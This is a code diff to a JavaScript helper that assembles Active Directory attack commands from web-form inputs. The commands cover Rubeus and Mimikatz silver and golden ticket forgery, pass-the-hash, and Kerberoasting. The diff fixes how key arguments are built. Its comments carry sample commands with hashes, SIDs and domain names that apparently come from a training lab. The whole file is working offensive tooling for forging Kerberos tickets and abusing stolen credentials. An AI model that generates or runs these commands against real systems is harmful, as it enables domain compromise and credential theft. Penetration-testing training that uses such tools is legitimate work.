@@ -167,7 +167,7 @@ function generateKerberosTicketsCommand(form_id) {
 		} else if (tool == "rubeus.exe") {
 			// Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
 			
-			command = `${toolsPath}${tool} silver /user:${user} /domain:${currentDomain} /service:${serviceSPN} /${aes256 ? 'aes256' : 'rc4'}:${aes256 + ' /opsec' || rc4} /sid:${currentDomainSID} /ldap  /ptt`;
+			command = `${toolsPath}${tool} silver /user:${user} /domain:${currentDomain} /service:${serviceSPN} /${aes256 ? 'aes256:' + aes256 + ' /opsec' : 'rc4:' + rc4} /sid:${currentDomainSID} /ldap  /ptt`;
 		}
 		else {
 			command = `${toolsPath}${tool} ${flags}`;
@@ -185,14 +185,14 @@ function generateKerberosTicketsCommand(form_id) {
 		let renewmax = document.querySelector("#form-golden #renewmax").value;
 
 		//  C:\ad\Tools\betterSafetyKatz.exe "kerberos::golden /user:Administrator /rc4:2368c4a2a27b01d0118cb809352f17be /domain:dollarcorp.moneycorp.local / /sid:S-1-5-21-719815819-3726368948-391768864 /ptt" "exit"
-		flags = `"kerberos::golden /User:${user} /domain:${currentDomain} /${aes256 ? 'aes256' : 'rc4'}:${aes256 + ' /opsec' || rc4} /sid:${currentDomainSID} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;
+		flags = `"kerberos::golden /User:${user} /domain:${currentDomain} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /sid:${currentDomainSID} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;
 		
 		if (tool == "invoke-mimikatz") {
 			command = `${tool} -Command '${flags}'`;
 		} else if (tool == "rubeus.exe") {
 			// Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd /ptt
 			
-			command = `${toolsPath}${tool} golden /${aes256 ? 'aes256' : 'rc4'}:${aes256 + ' /opsec' || rc4} /sid:${currentDomainSID} /domain:${currentDomain} /ldap /user:${user} /printcmd /ptt`;
+			command = `${toolsPath}${tool} golden /${aes256 ? 'aes256:' + aes256 + ' /opsec' : 'rc4:' + rc4} /sid:${currentDomainSID} /domain:${currentDomain} /ldap /user:${user} /printcmd /ptt`;
 		} else {
 			command = `${toolsPath}${tool} ${flags}`;
 		}
@@ -209,14 +209,14 @@ function generateKerberosTicketsCommand(form_id) {
 		
 		// C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:cmd.exe" "exit"
 		
-		flags = `"sekurlsa::pth /user:${user} /domain:${currentDomain} /${aes256 ? 'aes256' : 'rc4'}:${aes256 + ' /opsec' || rc4} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /run:C:\\Windows\\System32\\cmd.exe" "exit"`;
+		flags = `"sekurlsa::pth /user:${user} /domain:${currentDomain} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /run:C:\\Windows\\System32\\cmd.exe" "exit"`;
 		
 		if (tool == "invoke-mimikatz") {
 			command = `${tool} -Command '${flags}'`;
 		} else if (tool == "rubeus.exe") {
 			// Rubeus.exe asktgt /user:srvadmin /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 			
-			command = `${toolsPath}${tool} asktgt /user:${user} /domain:${currentDomain} /${aes256 ? 'aes256' : 'rc4'}:${aes256 + ' /opsec' || rc4} /ldap /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt`;
+			command = `${toolsPath}${tool} asktgt /user:${user} /domain:${currentDomain} /${aes256 ? 'aes256:' + aes256 + ' /opsec' : 'rc4:' + rc4} /ldap /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt`;
 		} else {
 			command = `${toolsPath}${tool} ${flags}`;
 		}
@@ -257,7 +257,7 @@ function generateKerberoastCommand(form_id) {
 		var user = document.querySelector("#form-kerberoast #spn").value;
 		var outfile = document.querySelector("#form-kerberoast #outfile").value;
 		
-		var flags = `kerberoast /user:${user} /simple /format:hashcat /rc4opsec /tgtdeleg /outfile:${outfile}`;
+		var flags = `kerberoast /user:${user} /simple /format:hashcat /tgtdeleg /outfile:${outfile}`;
 		
 		document.querySelector("#command-kerberoast").value = `${toolsPath}rubeus.exe ${flags}`;
 	} else if (form_id == "form-asreproast") {
